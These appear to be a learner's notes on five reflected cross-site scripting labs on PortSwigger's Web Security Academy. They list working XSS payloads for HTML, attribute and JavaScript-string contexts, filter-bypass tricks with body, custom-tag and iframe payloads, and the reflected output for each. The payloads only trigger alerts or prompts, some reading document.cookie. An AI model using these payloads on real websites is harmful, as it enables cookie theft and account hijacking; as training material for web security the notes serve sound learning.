## Lab1 - Reflected

# Search field: able to add the html tag
#payload tried
<b>hello</b>
#Result
<script>alert('xss')</script>
<img src="x" onerror="print('xss')">
-------------------------------------------------------------------------------------------------------------------------------------------

## Lab2: reflected XXS in html attribute context

* Payload
" autofocus onfocus=alert(document.cookie) " 
" autofocus onfocus=alert(document.cookie) x="
"onmouseover="alert(1)

* Output
<input type=text placeholder='Search the blog...' name=search value="" autofocus onfocus=alert(document.cookie) ""> - for 1st payload

-------------------------------------------------------------------------------------------------------------------------------------------

## Lab3 - JavaScript string with angle brackets HTML encoded
# Search field has reflected xss, but angular brackets are encoded. Its javascript context, so we need to come out of js context.
* payload

var searchTerms = '&lt;b&gt;hello&lt;/b&gt;';
<script>
    var searchTerms = '" onerror=alert(document.domain)';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

 <script>
    var searchTerms = ''-alert(document.domain)-'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

* Output
'-alert(document.domain)-'

-------------------------------------------------------------------------------------------------------------------------------------------

## Lab4 - Reflected XSS into HTML context with most tags and attributes blocked [DIFFICULT]
* Payload:
<img src=x onerror=alert(1)>  --> Tags not allowed, many tags were not allowed. So, with help of Intruder, foundout which tag and attributes are allowed.
tag:<body> is supported
events:
onbeforeinput
onratechange
onresize

Trail:
1] onbeforeinput - needs manual input
<body onbeforeinput='prompt(1)'>   -- search and then put any char in the search, b4 that prompts

<h1>0 search results for '<body onbeforeinput=prompt(1)>'</h1>  -- view source
<body onbeforeinput="prompt(1)">  -- inspect, if it finds 2 body tag it just removes that one but picks up the event from it & attaches it to the 1st body  tag.  --> It's a manual intervension

2] works only with audio or video
<video id="myVideo" width="320" height="240" autoplay controls onratechange="prompt(1)">
    <source src="movie.mp4" type="video/mp4">
    <source src="movie.ogg" type="video/ogg">
    Your browser does not support the video tag.
    </video><br>
<audio id="myAudio" controls onratechange=prompt(123)>
  <source src="horse.ogg" type="audio/ogg">
  <source src="horse.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>

<body onratechange=prompt(123)>  -- didn't worked

3] onresize - needs manual input
<body onresize=print(123)> --> search and resize, prompts

4] how to automate?
Can create an iframe(attacker controllable) and open lab page there, but it will not prompt, for that we need to trigger onload event of iframe so that on onload event width will increase and event will trigger 

<iframe src="https://0a820016043ea3a180a31c120090007f.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28123%29%3E" onload=this.style.width='100px'> - refer xss.html - when u open it, prompt will popup - just copy paste it in src of frame

Result:
<iframe src="" onload=this.stlye.width='100px'>
<iframe src="https://0a820016043ea3a180a31c120090007f.web-security-academy.net/?search=<body onresize=print(123)>" onload=this.style.width='100px'> 

-------------------------------------------------------------------------------------------------------------------------------------------
## Lab5: Reflected XSS into HTML context with all tags blocked except custom ones

[custom tag should have -(hiphen) in it]
We want to display alert so eighter we can focus that field so alert will display. 

onfocus — Event that is triggered when an element becomes the active element in the document, meaning it is selected for interaction. This can occur through various user actions, such as clicking on the element with the mouse, tabbing to the element using the keyboard, or tapping on the element on touch-enabled devices.
id=’x’ — The id attribute uniquely identifies an element within the document, which can be useful for targeting the element with CSS or JavaScript.
tabindex=’1' — This attribute specifies the order in which elements receive focus when navigating the page using the keyboard’s Tab key.

<xss-tag id=x onfocus=alert(document.cookie) tabindex=1> --> tab alert displays
<my-tag id='x' onfocus='alert(document.cookie)' tabindex='1'>#x -->Adding ‘#x’ to the end of your URL is telling the browser to open this page, then immediately ‘tab’ to ‘id=x’. And this will trigger our pop-up.

https://0abc007b034a1d7380ce30d5004b0076.web-security-academy.net/?search=<my-tag onfocus='alert(document.cookie)' id='x' tabindex='1'>#x

[Always use a tabindex attribute in ur payload with custom tag]
<custom id='a1' onfocus='alert(document.cookie)' tabindex='1'>#a1

https://0a71007a03e7bccc814c0df300bf003f.web-security-academy.net/?search=<custom id='a1' onfocus='alert(document.cookie)' tabindex='1'>#a1
<custom%20id='a1'%20onfocus='alert%3Cdocument.cookie%3E'%20tabindex='1'>#a1

All url is encoding which is not working

<my-tag id="x" onfocus="alert(document.cookie)" tabindex="1">#x ---> worked in search
<iframe src="https://0a71007a03e7bccc814c0df300bf003f.web-security-academy.net/?search=%3Cmy-tag+tabindex%3D%221%22+onfocus%3D%22alert(document.cookie)%22+id%3D%22a1%22%3E#a1"></iframe>   -- encoding giving problem not working
